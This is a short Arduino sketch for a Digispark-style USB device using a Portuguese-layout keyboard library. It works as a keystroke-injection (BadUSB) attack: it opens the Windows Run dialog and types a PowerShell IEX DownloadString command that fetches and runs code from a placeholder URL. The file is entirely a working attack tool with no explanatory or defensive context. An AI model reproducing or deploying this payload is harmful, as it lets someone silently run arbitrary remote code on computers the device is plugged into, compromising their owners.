#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('URL_DO _CODIGO');\"");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  for (;;) {}
}
